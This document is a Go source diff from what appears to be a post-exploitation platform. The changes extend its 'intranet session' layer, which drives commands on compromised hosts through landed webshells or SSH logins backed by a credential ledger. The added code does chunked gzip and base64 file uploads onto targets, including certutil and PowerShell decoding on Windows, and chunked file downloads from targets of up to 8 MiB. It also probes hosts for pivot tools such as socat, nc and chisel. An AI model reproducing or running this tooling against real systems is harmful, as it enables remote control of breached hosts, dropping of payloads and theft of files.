@@ -1,10 +1,13 @@
 package server
 
 import (
+	"bytes"
+	"compress/gzip"
 	"context"
 	"encoding/base64"
 	"errors"
 	"fmt"
+	"io"
 	"log"
 	"net"
 	"net/http"
@@ -14,6 +17,7 @@ import (
 	"regexp"
 	"strconv"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/Autumn-27/jingwei/db"
@@ -33,6 +37,12 @@ const (
 	intranetCwdMarker  = "__JW_CWD__"
 	intranetEcMarker   = "__JW_EC__"
 	intranetSizeMarker = "__JW_SIZE__"
+	intranetGzipMarker = "__JW_GZIP__"
+	intranetPSMarker   = "__JW_PS__"
+
+	intranetChunkMarker    = "__JW_CHUNK__"
+	intranetChunkEndMarker = "__JW_CHUNK_END__"
+	intranetHeartbeatMark  = "__JW_HB__"
 
 	intranetOSPosix   = "posix"
 	intranetOSWindows = "windows"
@@ -58,20 +68,24 @@ for b in socat nc ncat ssh chisel python3 python busybox; do command -v "$b" >/d
 	// cmd.exe caps a command line at 8191 characters; 4 KiB of content becomes
 	// ~5.5 KiB of base64 and leaves room for the cwd/chcp/trailer wrapper.
 	intranetWindowsUploadChunk = 4 * 1024
+	intranetDownloadChunk      = 96 * 1024
 	intranetUploadLimit        = 4 << 20
-	intranetDownloadLimit      = 512 << 10
-	intranetBatchLimit         = 50
-	intranetTunnelTTL          = time.Hour
-	intranetTunnelMaxTTL       = 24 * time.Hour
+	// Downloads used to be one shell command capped at 512 KiB. The chunked
+	// transport makes larger files practical while every response stays small.
+	intranetDownloadLimit        = 8 << 20
+	intranetWindowsCertutilLimit = 2 << 20
+	intranetBatchLimit           = 50
+	intranetTunnelTTL            = time.Hour
+	intranetTunnelMaxTTL         = 24 * time.Hour
 )
 
-type intranetExecOutcome struct {
-	Output   string `json:"output"`
-	Cwd      string `json:"cwd,omitempty"`
-	ExitCode int    `json:"exit_code"`
-	IsError  bool   `json:"is_error"`
-	Note     string `json:"note,omitempty"`
-}
+// intranetExecOutcome is one terminal turn on an intranet session. It is the same
+// shape the webshell and memory-horse terminals return, so an SSH session and a
+// landed shell cannot disagree about what "exit 0" or "we stopped waiting" means,
+// and one component renders both. The extra fields over the old
+// {output, cwd, exit_code} triple are additive: existing tool and UI readers that
+// ignore them keep working.
+type intranetExecOutcome = shellExecResult
 
 type intranetProbeInfo struct {
 	Host   string   `json:"host,omitempty"`
@@ -118,9 +132,15 @@ func intranetScript(cwd, command string) string {
 	if strings.TrimSpace(cwd) == "" {
 		cwd = "/"
 	}
+	// 命令放进子 shell，尾部标记由 EXIT trap 打印：维持模块的部署脚本都以
+	// set -e 开头，原写法里任何一步失败都会让尾部 printf 根本不执行，退出码和
+	// 已产生的输出一起丢失，台账只剩「未解析到命令结束标记」这句无从复核的话。
+	// 2>&1 是因为 web 壳通常只回传 stdout，目标侧的 Permission denied 一类的报错
+	// 全落在 web 服务器的错误日志里，取证时看不见。cd 仍在子 shell 之外，
+	// 子 shell 内的 cd 会被 trap 里的 $PWD 读到，会话目录跟踪不受影响。
 	return "cd " + shQuote(cwd) + " 2>/dev/null || cd /\n" +
-		command + "\n__jw_ec=$?\n" +
-		"printf '\\n__JW_CWD__%s\\n__JW_EC__%s\\n' \"$PWD\" \"$__jw_ec\"\n"
+		"(\ntrap 'printf \"\\n" + intranetCwdMarker + "%s\\n" + intranetEcMarker + "%s\\n\" \"$PWD\" \"$?\"' EXIT\n" +
+		command + "\n) 2>&1\n"
 }
 
 // intranetScriptWindows is the cmd.exe counterpart. PHP system() on Windows
@@ -223,6 +243,20 @@ func parseCertutilBase64(raw string) ([]byte, error) {
 	return base64.StdEncoding.DecodeString(body)
 }
 
+// classifyOSProbe reads the OS probe echo. ok=false means the echo is not an
+// answer at all (shell unreachable, 404 page, wrong protocol): callers must not
+// cache that as POSIX, or a Windows box that was merely down keeps the wrong
+// wrapper after it comes back.
+func classifyOSProbe(raw string, err error) (kind string, ok bool) {
+	if err != nil || !strings.Contains(raw, "__JW_OS__") {
+		return intranetOSPosix, false
+	}
+	if strings.Contains(raw, "__JW_OS__Windows_NT") {
+		return intranetOSWindows, true
+	}
+	return intranetOSPosix, true
+}
+
 // intranetOS returns the target shell family, probing once and caching the
 // result in session metadata. Detection failures fall back to POSIX.
 func (s *Server) intranetOS(ctx context.Context, pg *db.DB, sess *db.IntranetSession) string {
@@ -230,23 +264,14 @@ func (s *Server) intranetOS(ctx context.Context, pg *db.DB, sess *db.IntranetSes
 		return v
 	}
 	osKind := intranetOSPosix
-	detected := false
-	if shell, err := s.intranetShell(pg, sess); err == nil {
-		payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
-		client := scanner.NewDeepClient(30 * time.Second)
-		if raw, rerr := scanner.RunShellCommand(ctx, client, shell.URL, payload, intranetOSProbe); rerr == nil &&
-			strings.Contains(raw, "__JW_OS__") {
-			detected = true
-			if strings.Contains(raw, "__JW_OS__Windows_NT") {
-				osKind = intranetOSWindows
-			}
-		}
-	}
 	// 探测失败（shell 暂时不可用、404 页面等）不能缓存为 posix：
 	// 否则 Windows 会话在 shell 恢复后仍会一直使用 POSIX wrapper。
-	if !detected {
+	raw, err := s.intranetSendScript(ctx, pg, sess, intranetOSProbe, 30*time.Second)
+	probed, ok := classifyOSProbe(raw, err)
+	if !ok {
 		return osKind
 	}
+	osKind = probed
 	if updated, err := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": osKind}); err == nil && updated != nil {
 		*sess = *updated
 	} else {
@@ -256,6 +281,87 @@ func (s *Server) intranetOS(ctx context.Context, pg *db.DB, sess *db.IntranetSes
 		sess.Metadata["os"] = osKind
 	}
 	return osKind
+}
+
+// intranetIsSSH reports whether a session is carried by an SSH login instead of a
+// webshell. SSH sessions have no webshell_id by design: the hosts they cover are
+// the ones with no web service at all.
+func intranetIsSSH(sess *db.IntranetSession) bool {
+	return sess != nil && sess.Transport == db.IntranetTransportSSH
+}
+
+// intranetSSHAuth resolves the SSH channel parameters of a session. The password
+// is read from the credential ledger on every use so it exists in exactly one
+// place; a session whose credential was deleted is dead, and says so.
+func (s *Server) intranetSSHAuth(pg *db.DB, sess *db.IntranetSession) (scanner.SSHCommandTarget, error) {
+	if sess == nil {
+		return scanner.SSHCommandTarget{}, errors.New("无效的会话")
+	}
+	addr := sess.SSHDialAddr()
+	if addr == "" {
+		return scanner.SSHCommandTarget{}, errors.New("SSH 会话缺少目标地址")
+	}
+	if sess.SSHCredentialID <= 0 {
+		return scanner.SSHCommandTarget{}, errors.New("SSH 会话未绑定凭据台账中的凭据")
+	}
+	cred, err := pg.GetIntranetCredential(sess.SSHCredentialID)
+	if err != nil || cred == nil {
+		return scanner.SSHCommandTarget{}, fmt.Errorf("SSH 会话绑定的凭据 #%d 已不存在，请重新登记凭据后再开会话", sess.SSHCredentialID)
+	}
+	if cred.SealBroken {
+		// The row holds a password we cannot read. Dialing with an empty or
+		// ciphertext password would come back as "authentication failed" and could
+		// trip a lockout on the target, so stop and say what is actually wrong.
+		return scanner.SSHCommandTarget{}, fmt.Errorf("凭据 #%d 的口令无法解封（平台签名密钥已更换），请重新登记该凭据", cred.ID)
+	}
+	user := strings.TrimSpace(sess.SSHUser)
+	if user == "" {
+		user = strings.TrimSpace(cred.Username)
+	}
+	if user == "" {
+		return scanner.SSHCommandTarget{}, errors.New("SSH 会话缺少登录账号")
+	}
+	return scanner.SSHCommandTarget{Addr: addr, User: user, Password: cred.Password}, nil
+}
+
+// intranetTransportCheck fails fast when the channel a session runs on is not
+// usable, so callers do not spend a probe round-trip finding out.
+func (s *Server) intranetTransportCheck(pg *db.DB, sess *db.IntranetSession) error {
+	if intranetIsSSH(sess) {
+		_, err := s.intranetSSHAuth(pg, sess)
+		return err
+	}
+	_, err := s.intranetShell(pg, sess)
+	return err
+}
+
+// intranetSendScript delivers one already-wrapped script to the target and
+// returns its raw echo. Everything above it (cwd tracking, exit codes, events)
+// is transport-agnostic because both channels return the same marker protocol.
+func (s *Server) intranetSendScript(ctx context.Context, pg *db.DB, sess *db.IntranetSession, script string, timeout time.Duration) (string, error) {
+	if timeout <= 0 {
+		timeout = intranetExecTimeout
+	}
+	if intranetIsSSH(sess) {
+		target, err := s.intranetSSHAuth(pg, sess)
+		if err != nil {
+			return "", err
+		}
+		target.Timeout = timeout
+		return scanner.RunSSHCommand(ctx, target, script)
+	}
+	shell, err := s.intranetShell(pg, sess)
+	if err != nil {
+		return "", err
+	}
+	payload, err := s.shellPayloadFor(shell)
+	if err != nil {
+		return "", err
+	}
+	client := scanner.NewDeepClient(timeout)
+	cctx, cancel := context.WithTimeout(ctx, timeout+5*time.Second)
+	defer cancel()
+	return scanner.RunShellCommand(cctx, client, shell.URL, payload, script)
 }
 
 // parseIntranetOutput splits the cwd/exit-code markers off the command output.
@@ -364,54 +470,75 @@ func (s *Server) intranetShell(pg *db.DB, sess *db.IntranetSession) (*db.Webshel
 	return shell, nil
 }
 
+// intranetSender adapts a session's transport (SSH login or bound webshell) to the
+// channel-agnostic sender the shared terminal core drives. Both transports already
+// speak the __JW_CWD__/__JW_EC__ trailer, so only the delivery differs here.
+func (s *Server) intranetSender(pg *db.DB, sess *db.IntranetSession) shellSender {
+	return func(ctx context.Context, script string, timeout time.Duration) (string, error) {
+		return s.intranetSendScript(ctx, pg, sess, script, timeout)
+	}
+}
+
+// intranetTurnLocks serializes turns on one session. Two browser tabs, or a tab
+// and the background heartbeat, otherwise read the same stored cwd, run
+// concurrently, and the last write wins — the terminal then resumes from a
+// directory nobody asked for, and the operator reads output from the wrong place.
+var intranetTurnLocks sync.Map // sessionID -> *sync.Mutex
+
+func intranetTurnLock(sessionID int64) *sync.Mutex {
+	mu, _ := intranetTurnLocks.LoadOrStore(sessionID, &sync.Mutex{})
+	return mu.(*sync.Mutex)
+}
+
 // intranetRun executes one command on the session's webshell without writing an
 // event (upload uses this for each chunk). It updates the stored cwd on success.
 func (s *Server) intranetRun(ctx context.Context, pg *db.DB, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
+	mu := intranetTurnLock(sess.ID)
+	mu.Lock()
+	defer mu.Unlock()
+	return s.intranetRunLocked(pg, ctx, sess, command, timeout)
+}
+
+// intranetRunLocked is one turn with the session lock already held. Callers that
+// need to skip a busy session (the heartbeat) take the lock themselves with
+// TryLock; everything else goes through intranetRun.
+func (s *Server) intranetRunLocked(pg *db.DB, ctx context.Context, sess *db.IntranetSession, command string, timeout time.Duration) intranetExecOutcome {
 	out := intranetExecOutcome{ExitCode: -1}
-	if strings.TrimSpace(command) == "" {
-		out.IsError, out.Note = true, "命令不能为空"
-		return out
-	}
-	shell, err := s.intranetShell(pg, sess)
-	if err != nil {
+	if err := s.intranetTransportCheck(pg, sess); err != nil {
 		out.IsError, out.Note = true, err.Error()
 		return out
 	}
 	if timeout <= 0 {
 		timeout = intranetExecTimeout
 	}
-	cctx, cancel := context.WithTimeout(ctx, timeout+5*time.Second)
-	defer cancel()
-	payload := scanner.BuildShellPayload(shell.ShellType, shell.Password)
-	client := scanner.NewDeepClient(timeout)
-	osKind := s.intranetOS(cctx, pg, sess)
-	script := intranetScript(sess.Cwd, command)
-	if osKind == intranetOSWindows {
-		script = intranetScriptWindows(sess.Cwd, command)
+	// Only a family the session already recorded counts as known. intranetOS
+	// returns POSIX as a wrapper choice when its probe never answered, and feeding
+	// that guess in here would let one unreachable moment pin a cmd box to the
+	// POSIX wrapper for the life of the session.
+	cached := ""
+	if v, ok := sess.Metadata["os"].(string); ok && (v == intranetOSPosix || v == intranetOSWindows) {
+		cached = v
 	}
-	raw, err := scanner.RunShellCommand(cctx, client, shell.URL, payload, script)
-	if err != nil {
-		out.Output, out.IsError, out.Note = raw, true, err.Error()
-		return out
+	res := shellExec(ctx, s.intranetSender(pg, sess), sess.Cwd, cached, command, timeout)
+	if res.OSKind != "" && res.OSKind != cached {
+		if updated, merr := pg.SetIntranetSessionMetadata(sess.ID, map[string]any{"os": res.OSKind}); merr == nil && updated != nil {
+			*sess = *updated
+		}
 	}
-	output, cwd, exitCode, ok := parseIntranetOutput(raw)
-	if !ok {
-		out.Output, out.IsError = raw, true
-		out.Note = "未解析到命令结束标记：目标可能不是预期的 shell 类型，或命令中断了执行"
-		return out
+	if res.Cwd == "" {
+		// Delivery failed or the trailer never arrived. last_seen must not advance:
+		// the stale-session scan selects on it, so touching here would mark a dead
+		// session healthy because of a command that never ran.
+		return res
 	}
-	out.Output, out.Cwd, out.ExitCode = output, cwd, exitCode
-	if exitCode > 0 {
-		out.IsError = true
-	}
-	if intranetAbsCwd(osKind, cwd) && cwd != sess.Cwd {
-		if updated, uerr := pg.UpdateIntranetSessionState(sess.ID, cwd, "", ""); uerr == nil && updated != nil {
+	if res.Cwd != sess.Cwd {
+		if updated, uerr := pg.UpdateIntranetSessionState(sess.ID, res.Cwd, "", ""); uerr == nil && updated != nil {
 			*sess = *updated
 		}
 	} else {
 		_ = pg.TouchIntranetSession(sess.ID)
 	}
-	return out
+	return res
 }
 
 // intranetExec records the run as a session event and returns it.
@@ -419,6 +546,364 @@ func (s *Server) intranetExec(ctx context.Context, pg *db.DB, sess *db.IntranetS
 	out := s.intranetRun(ctx, pg, sess, command, timeout)
 	_ = pg.AddIntranetSessionEvent(sess.ID, "exec", command, truncateIntranetOutput(out.Output, 8000), out.IsError)
 	return out
+}
+
+// intranetCommandRunner abstracts one target-side command execution so the
+// chunked transfer logic can be exercised against a local shell in tests.
+type intranetCommandRunner func(command string, timeout time.Duration) intranetExecOutcome
+
+// gzipIntranetContent compresses a payload only when it actually shrinks.
+// Small or already-compressed files keep the plain base64 transport.
+func gzipIntranetContent(content []byte) ([]byte, bool) {
+	if len(content) < 512 {
+		return nil, false
+	}
+	var buf bytes.Buffer
+	zw, err := gzip.NewWriterLevel(&buf, gzip.BestSpeed)
+	if err != nil {
+		return nil, false
+	}
+	if _, err := zw.Write(content); err != nil {
+		return nil, false
+	}
+	if err := zw.Close(); err != nil {
+		return nil, false
+	}
+	if buf.Len() >= len(content) {
+		return nil, false
+	}
+	return buf.Bytes(), true
+}
+
+func parseGzipChunk(raw []byte) ([]byte, bool) {
+	if len(raw) < 2 || raw[0] != 0x1f || raw[1] != 0x8b {
+		return nil, false
+	}
+	zr, err := gzip.NewReader(bytes.NewReader(raw))
+	if err != nil {
+		return nil, false
+	}
+	defer zr.Close()
+	out, err := io.ReadAll(io.LimitReader(zr, int64(intranetDownloadChunk)+1))
+	if err != nil {
+		return nil, false
+	}
+	return out, true
+}
+
+func parseIntranetChunk(output string) ([]byte, bool) {
+	i := strings.Index(output, intranetChunkMarker)
+	if i < 0 {
+		return nil, false
+	}
+	rest := output[i+len(intranetChunkMarker):]
+	j := strings.Index(rest, intranetChunkEndMarker)
+	if j < 0 {
+		return nil, false
+	}
+	encoded := strings.Join(strings.Fields(rest[:j]), "")
+	data, err := base64.StdEncoding.DecodeString(encoded)
+	if err != nil {
+		return nil, false
+	}
+	return data, true
+}
+
+func parseIntranetDownloadMeta(output string) (total int64, gzipOK, ok bool) {
+	total = -1
+	for _, line := range strings.Split(output, "\n") {
+		line = strings.TrimSpace(line)
+		switch {
+		case strings.HasPrefix(line, intranetSizeMarker):
+			fields := strings.Fields(strings.TrimPrefix(line, intranetSizeMarker))
+			if len(fields) == 0 {
+				continue
+			}
+			n, err := strconv.ParseInt(fields[0], 10, 64)
+			if err == nil && n >= 0 {
+				total, ok = n, true
+			}
+		case strings.HasPrefix(line, intranetGzipMarker):
+			gzipOK = strings.TrimPrefix(line, intranetGzipMarker) == "1"
+		}
+	}
+	return total, gzipOK, ok
+}
+
+func intranetDownloadMetaCmd(path string) string {
+	return "printf '" + intranetSizeMarker + "%s\\n' \"$(wc -c < " + shQuote(path) + " 2>/dev/null)\"; " +
+		"command -v gzip >/dev/null 2>&1 && echo '" + intranetGzipMarker + "1' || echo '" + intranetGzipMarker + "0'"
+}
+
+func intranetDownloadChunkCmd(path string, offset, n int64, compress bool) string {
+	pipe := "tail -c +" + strconv.FormatInt(offset+1, 10) + " " + shQuote(path) +
+		" | head -c " + strconv.FormatInt(n, 10)
+	if compress {
+		pipe += " | gzip -c"
+	}
+	pipe += " | base64 | tr -d '\\n'"
+	return "printf '" + intranetChunkMarker + "'; " + pipe + "; printf '" + intranetChunkEndMarker + "'"
+}
+
+func intranetUploadPOSIX(run intranetCommandRunner, path string, content []byte) (out intranetExecOutcome, compressed, existed bool, err error) {
+	out = intranetExecOutcome{ExitCode: -1}
+	probe := run("test -e "+shQuote(path)+" && echo JW_FILE_EXISTS || echo JW_FILE_NEW", 15*time.Second)
+	existed = strings.Contains(probe.Output, "JW_FILE_EXISTS")
+
+	gz, worthIt := gzipIntranetContent(content)
+	gzipOK := false
+	if worthIt {
+		caps := run("command -v gzip >/dev/null 2>&1 && echo '"+intranetGzipMarker+"1' || echo '"+intranetGzipMarker+"0'", 15*time.Second)
+		gzipOK = strings.Contains(caps.Output, intranetGzipMarker+"1")
+	}
+	if gzipOK {
+		out, err = intranetUploadPOSIXGzip(run, path, gz, len(content))
+		if err != nil {
+			return out, false, existed, err
+		}
+		return out, true, existed, nil
+	}
+
+	for offset := 0; offset < len(content); offset += intranetUploadChunk {
+		end := offset + intranetUploadChunk
+		if end > len(content) {
+			end = len(content)
+		}
+		op := ">>"
+		if offset == 0 {
+			op = ">"
+		}
+		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
+		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(path)
+		part := run(cmd, 30*time.Second)
+		if part.IsError {
+			part.IsError = true
+			part.Note = fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
+			return part, false, existed, errors.New(part.Note)
+		}
+	}
+	check := run("wc -c < "+shQuote(path), 20*time.Second)
+	got, perr := strconv.ParseInt(strings.TrimSpace(check.Output), 10, 64)
+	if check.IsError || perr != nil || got != int64(len(content)) {
+		check.IsError = true
+		check.Note = fmt.Sprintf("写入后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(check.Output))
+		return check, false, existed, errors.New(check.Note)
+	}
+	out = check
+	out.Output = fmt.Sprintf("已写入 %s（%d 字节）\n%s", path, len(content), strings.TrimSpace(check.Output))
+	return out, false, existed, nil
+}
+
+func intranetUploadPOSIXGzip(run intranetCommandRunner, path string, gz []byte, size int) (intranetExecOutcome, error) {
+	out := intranetExecOutcome{ExitCode: -1}
+	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
+	tempGZ := path + suffix + ".gz"
+	tempPart := path + suffix + ".part"
+	cleanup := func() {
+		_ = run("rm -f "+shQuote(tempGZ)+" "+shQuote(tempPart), 10*time.Second)
+	}
+	for offset := 0; offset < len(gz); offset += intranetUploadChunk {
+		end := offset + intranetUploadChunk
+		if end > len(gz) {
+			end = len(gz)
+		}
+		op := ">>"
+		if offset == 0 {
+			op = ">"
+		}
+		chunk := base64.StdEncoding.EncodeToString(gz[offset:end])
+		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(tempGZ)
+		part := run(cmd, 30*time.Second)
+		if part.IsError {
+			cleanup()
+			part.IsError = true
+			part.Note = fmt.Sprintf("写入压缩块 %d 失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
+			return part, errors.New(part.Note)
+		}
+	}
+	decompress := "gzip -dc " + shQuote(tempGZ) + " > " + shQuote(tempPart) +
+		" && test \"$(wc -c < " + shQuote(tempPart) + " | tr -d '[:space:]')\" -eq " + strconv.Itoa(size) +
+		" && mv -f " + shQuote(tempPart) + " " + shQuote(path)
+	moved := run(decompress, 60*time.Second)
+	if moved.IsError {
+		cleanup()
+		moved.IsError = true
+		moved.Note = "解压或覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
+		return moved, errors.New(moved.Note)
+	}
+	cleanup()
+	out = moved
+	out.Output = fmt.Sprintf("已写入 %s（%d 字节，gzip 传输 %d 字节）", path, size, len(gz))
+	return out, nil
+}
+
+func intranetWindowsPowerShellPath() string {
+	return `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe`
+}
+
+func intranetWindowsPSAvailableCmd() string {
+	return `if exist "` + intranetWindowsPowerShellPath() + `" (echo ` + intranetPSMarker + `1) else (echo ` + intranetPSMarker + `0)`
+}
+
+func intranetUploadWindows(run intranetCommandRunner, path string, content []byte) (out intranetExecOutcome, compressed, existed bool, err error) {
+	out = intranetExecOutcome{ExitCode: -1}
+	target, normalized, ok := intranetWindowsPath(path)
+	if !ok {
+		out.IsError, out.Note = true, "Windows 目标路径必须是盘符绝对路径，且不能包含引号、% 或通配符"
+		return out, false, false, errors.New(out.Note)
+	}
+	if strings.HasSuffix(normalized, `\`) {
+		out.IsError, out.Note = true, "Windows 目标路径必须是文件而不是目录"
+		return out, false, false, errors.New(out.Note)
+	}
+
+	probe := run("if exist "+target+" (echo JW_FILE_EXISTS) else (echo JW_FILE_NEW)", 15*time.Second)
+	existed = strings.Contains(probe.Output, "JW_FILE_EXISTS")
+
+	psOut := run(intranetWindowsPSAvailableCmd(), 15*time.Second)
+	psOK := strings.Contains(psOut.Output, intranetPSMarker+"1")
+	gz, worthIt := gzipIntranetContent(content)
+	if psOK && worthIt {
+		out, err = intranetUploadWindowsGzip(run, normalized, target, gz, len(content))
+		if err != nil {
+			return out, false, existed, err
+		}
+		return out, true, existed, nil
+	}
+
+	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
+	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
+	if !ok {
+		out.IsError, out.Note = true, "无法构造临时文件路径"
+		return out, false, existed, errors.New(out.Note)
+	}
+	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
+	if !ok {
+		out.IsError, out.Note = true, "无法构造临时文件路径"
+		return out, false, existed, errors.New(out.Note)
+	}
+	cleanup := func() {
+		_ = run("del /f /q "+b64Temp+" "+binTemp, 10*time.Second)
+	}
+	for offset := 0; offset < len(content); offset += intranetWindowsUploadChunk {
+		end := offset + intranetWindowsUploadChunk
+		if end > len(content) {
+			end = len(content)
+		}
+		op := ">>"
+		if offset == 0 {
+			op = ">"
+		}
+		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
+		part := run("echo "+chunk+op+b64Temp, 30*time.Second)
+		if part.IsError {
+			cleanup()
+			part.IsError = true
+			part.Note = fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
+			return part, false, existed, errors.New(part.Note)
+		}
+	}
+
+	decode := run("certutil -decode -f "+b64Temp+" "+binTemp, 30*time.Second)
+	if decode.IsError {
+		cleanup()
+		decode.IsError = true
+		decode.Note = "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
+		return decode, false, existed, errors.New(decode.Note)
+	}
+	sizeOut := run(intranetWindowsSizeCmd(binTemp), 20*time.Second)
+	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
+	if got != len(content) {
+		cleanup()
+		sizeOut.IsError = true
+		sizeOut.Note = fmt.Sprintf("解码后大小不符（期望 %d，实际 %q）", len(content), strings.TrimSpace(sizeOut.Output))
+		return sizeOut, false, existed, errors.New(sizeOut.Note)
+	}
+
+	moved := run("move /y "+binTemp+" "+target, 20*time.Second)
+	if moved.IsError {
+		cleanup()
+		moved.IsError = true
+		moved.Note = "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
+		return moved, false, existed, errors.New(moved.Note)
+	}
+	cleanup()
+	out = moved
+	out.Output = fmt.Sprintf("已写入 %s（%d 字节）", path, len(content))
+	return out, false, existed, nil
+}
+
+func intranetUploadWindowsGzip(run intranetCommandRunner, normalized, target string, gz []byte, size int) (intranetExecOutcome, error) {
+	out := intranetExecOutcome{ExitCode: -1}
+	suffix := ".jw" + strconv.FormatInt(time.Now().UnixNano(), 10)
+	b64Temp, _, ok := intranetWindowsPath(normalized + suffix + ".b64")
+	if !ok {
+		out.IsError, out.Note = true, "无法构造临时文件路径"
+		return out, errors.New(out.Note)
+	}
+	gzName := normalized + suffix + ".gz"
+	gzTemp, _, ok := intranetWindowsPath(gzName)
+	if !ok {
+		out.IsError, out.Note = true, "无法构造临时文件路径"
+		return out, errors.New(out.Note)
+	}
+	binTemp, _, ok := intranetWindowsPath(normalized + suffix + ".bin")
+	if !ok {
+		out.IsError, out.Note = true, "无法构造临时文件路径"
+		return out, errors.New(out.Note)
+	}
+	cleanup := func() {
+		_ = run("del /f /q "+b64Temp+" "+gzTemp+" "+binTemp, 10*time.Second)
+	}
+	for offset := 0; offset < len(gz); offset += intranetWindowsUploadChunk {
+		end := offset + intranetWindowsUploadChunk
+		if end > len(gz) {
+			end = len(gz)
+		}
+		op := ">>"
+		if offset == 0 {
+			op = ">"
+		}
+		chunk := base64.StdEncoding.EncodeToString(gz[offset:end])
+		part := run("echo "+chunk+op+b64Temp, 30*time.Second)
+		if part.IsError {
+			cleanup()
+			part.IsError = true
+			part.Note = fmt.Sprintf("写入压缩块 %d 失败: %s", offset/intranetWindowsUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
+			return part, errors.New(part.Note)
+		}
+	}
+	decode := run("certutil -decode -f "+b64Temp+" "+gzTemp, 30*time.Second)
+	if decode.IsError {
+		cleanup()
+		decode.IsError = true
+		decode.Note = "certutil 解码失败: " + strings.TrimSpace(decode.Output+decode.Note)
+		return decode, errors.New(decode.Note)
+	}
+	gunzip := `$in=[IO.File]::OpenRead('` + gzName + `');$out=[IO.File]::Create('` + normalized + suffix + `.bin');` +
+		`$gz=New-Object IO.Compression.GZipStream($in,[IO.Compression.CompressionMode]::Decompress);` +
+		`$buf=New-Object byte[] 81920;while(($n=$gz.Read($buf,0,$buf.Length)) -gt 0){$out.Write($buf,0,$n)};` +
+		`$gz.Close();$out.Close();$in.Close()`
+	unpacked := run(`"`+intranetWindowsPowerShellPath()+`" -NoProfile -NonInteractive -Command "`+gunzip+`"`, 60*time.Second)
+	sizeOut := run(intranetWindowsSizeCmd(binTemp), 20*time.Second)
+	got, _ := strconv.Atoi(strings.TrimSpace(sizeOut.Output))
+	if unpacked.IsError || got != size {
+		cleanup()
+		sizeOut.IsError = true
+		sizeOut.Note = fmt.Sprintf("解压后大小不符（期望 %d，实际 %q）", size, strings.TrimSpace(sizeOut.Output))
+		return sizeOut, errors.New(sizeOut.Note)
+	}
+	moved := run("move /y "+binTemp+" "+target, 20*time.Second)
+	if moved.IsError {
+		cleanup()
+		moved.IsError = true
+		moved.Note = "覆盖目标文件失败: " + strings.TrimSpace(moved.Output+moved.Note)
+		return moved, errors.New(moved.Note)
+	}
+	cleanup()
+	out = moved
+	out.Output = fmt.Sprintf("已写入 %s（%d 字节，gzip 传输 %d 字节）", target, size, len(gz))
+	return out, nil
 }
 
 func (s *Server) intranetUpload(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, content []byte) (intranetExecOutcome, error) {
@@ -437,129 +922,28 @@ func (s *Server) intranetUpload(ctx context.Context, pg *db.DB, sess *db.Intrane
 		return out, errors.New(out.Note)
 	}
 	osKind := s.intranetOS(ctx, pg, sess)
+	run := func(command string, timeout time.Duration) intranetExecOutcome {
+		return s.intranetRun(ctx, pg, sess, command, timeout)
+	}
+	var compressed, existed bool
+	var err error
 	if osKind == intranetOSWindows {
-		return s.intranetUploadWindows(ctx, pg, sess, path, content)
+		out, compressed, existed, err = intranetUploadWindows(run, path, content)
+	} else {
+		out, compressed, existed, err = intranetUploadPOSIX(run, path, content)
+	}
+	if err != nil {
+		_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(strings.TrimSpace(out.Output+out.Note), 4000), true)
+		return out, err
+	}
+	if compressed {
+		out.Output += "\n传输方式：gzip 分块压缩"
 	}
 	// Overwriting a pre-existing file must not make cleanup delete someone
 	// else's file, so only newly created paths enter the artifact ledger.
-	existed := false
-	if probe := s.intranetRun(ctx, pg, sess, "test -e "+shQuote(path)+" && echo JW_FILE_EXISTS || echo JW_FILE_NEW", 15*time.Second); strings.Contains(probe.Output, "JW_FILE_EXISTS") {
-		existed = true
-	}
-	for offset := 0; offset < len(content); offset += intranetUploadChunk {
-		end := offset + intranetUploadChunk
-		if end > len(content) {
-			end = len(content)
-		}
-		op := ">>"
-		if offset == 0 {
-			op = ">"
-		}
-		chunk := base64.StdEncoding.EncodeToString(content[offset:end])
-		cmd := "printf '%s' '" + chunk + "' | base64 -d " + op + " " + shQuote(path)
-		part := s.intranetRun(ctx, pg, sess, cmd, 30*time.Second)
-		if part.IsError {
-			msg := fmt.Sprintf("写入第 %d 块失败: %s", offset/intranetUploadChunk+1, strings.TrimSpace(part.Output+part.Note))
-			_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, msg, true)
-			return part, errors.New(msg)
-		}
-	}
-	check := s.intranetRun(ctx, pg, sess, "wc -c < "+shQuote(path), 20*time.Second)
-	out = check
-	out.Output = fmt.Sprintf("已写入 %s（%d 字节）\n%s", path, len(content), strings.TrimSpace(check.Output))
 	_ = pg.AddIntranetSessionEvent(sess.ID, "upload", path, truncateIntranetOutput(out.Output, 4000), false)
 	if !existed {
 		s.registerUploadedArtifact(ctx, pg, sess, osKind, path, len(content), &out)
-	}
-	return out, nil
-}
-
-// intranetUploadWindows writes base64 chunks to a temp file, lets certutil
-// decode them, verifies the decoded size, then moves the result over the
-// target. Writing to a temp file first avoids destroying an existing target
-// when decoding fails halfway.
-func (s *Server) intranetUploadWindows(ctx context.Context, pg *db.DB, sess *db.IntranetSession, path string, content []byte) (intranetExecOutcome, error) {
-	out := intranetExecOutcome{ExitCode: -1}
-	target, normalized, ok := intranetWindowsPath(path)
